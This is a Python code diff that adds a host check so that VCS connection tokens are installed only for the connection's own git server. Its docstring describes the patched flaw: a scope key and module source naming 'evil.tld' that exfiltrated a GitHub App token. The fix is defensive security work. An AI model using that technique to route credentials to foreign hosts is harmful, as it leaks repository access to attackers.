@@ -320,6 +320,82 @@ def _matches_any(canonical: str, patterns: list[str]) -> bool:
     return False
 
 
+def _url_host(url: str) -> str:
+    """The lowercased host of a URL or bare `host[/path]`, or "" if it has none."""
+    from urllib.parse import urlsplit
+
+    raw = (url or "").strip()
+    if not raw:
+        return ""
+    parsed = urlsplit(raw if "://" in raw else f"https://{raw}")
+    return (parsed.hostname or "").lower()
+
+
+def connection_git_host(conn: VCSConnection | None) -> str:
+    """The ONE host a credential minted from this connection may be installed at.
+
+    For GitLab `server_url` is the instance, so it is the git host directly. For
+    GitHub it is the **API** base — `https://api.github.com` by default, or
+    `https://ghe.example.com/api/v3` for an Enterprise install — so the default has to
+    be mapped to `github.com` while a GHE host passes through unchanged.
+    """
+    if conn is None:
+        return ""
+    from terrapod.services import github_service, gitlab_service
+
+    raw = (getattr(conn, "server_url", "") or "").strip()
+    if getattr(conn, "provider", "") == "gitlab":
+        return _url_host(raw or gitlab_service.DEFAULT_GITLAB_URL)
+    host = _url_host(raw or github_service.DEFAULT_GITHUB_API_URL)
+    # `api.github.com` serves the API; repositories live on `github.com`. Every other
+    # value is a GHE host and is already the git host.
+    return "github.com" if host == "api.github.com" else host
+
+
+def credential_scope_host_allowed(conn: VCSConnection | None, scope: str) -> bool:
+    """Whether a credential at `scope` would be installed at THIS connection's host.
+
+    **This is a separate and stronger invariant than the repository allowlist, and it
+    is enforced whether or not an allowlist is set.** The allowlist is opt-in and
+    answers "which repositories"; this answers "whose server", and there is no
+    legitimate configuration in which a token minted from one provider account should
+    be handed to a different host.
+
+    Without it the allowlist could be satisfied while the credential went elsewhere
+    entirely. `_scope_repo_form` discards the scope's first segment as the host and
+    nothing compared it to anything, so a connection restricted to `myorg/*` accepted
+    the key `evil.tld/myorg`: the runner then wrote
+    `[credential "https://evil.tld/myorg"]` with the connection's GitHub App
+    installation token, and a module source of `git::https://evil.tld/myorg/x.git` in
+    the workspace's own configuration sent that token — `contents: read` across the
+    whole installation — to a host the attacker chose. Reachable by anyone who can
+    write a workspace variable on a workspace the connection is already attached to,
+    because the mint path deliberately skips `may_reference_connection` for the
+    workspace's own connection.
+    """
+    if conn is None:
+        return False
+    expected = connection_git_host(conn)
+    if not expected:
+        # Cannot establish the connection's own host, so cannot establish that the
+        # scope matches it. Refusing is the only safe answer.
+        return False
+    return _url_host(scope) == expected
+
+
+def credential_scope_host_refusal_detail(conn_id: uuid.UUID, scope: str, expected: str) -> str:
+    """Named separately because the remedy is not "widen the allowlist"."""
+    return (
+        f"git credential scope {scope!r} names host {_url_host(scope) or '<none>'!r}, "
+        f"but VCS connection vcs-{conn_id} serves {expected!r}. A credential minted "
+        "from a connection is only ever installed for that connection's own host — "
+        "otherwise its token would be sent to a server the connection has nothing to "
+        "do with. Correct the variable's key to use "
+        f"{expected!r}, or use a `static` credential holding a token you have scoped "
+        "yourself if you genuinely need to authenticate to another host."
+    )
+
+
 def _scope_repo_form(scope: str) -> str:
     """A git credential scope reduced to the `owner/repo` shape patterns are in.
 
@@ -364,6 +440,18 @@ def credential_scope_allowed(conn: VCSConnection | None, scope: str) -> bool:
     """
     if conn is None:
         return False
+
+    # The host check runs BEFORE the allowlist's opt-in short-circuit, deliberately:
+    # it is a different invariant, and an empty allowlist must not mean "this
+    # connection's token may be installed for any host in the world".
+    if not credential_scope_host_allowed(conn, scope):
+        logger.warning(
+            "a git credential scope names a host this connection does not serve; refusing",
+            scope=scope,
+            expected_host=connection_git_host(conn),
+        )
+        return False
+
     patterns, decided = _patterns_or_verdict(conn)
     if decided is not None:
         return decided
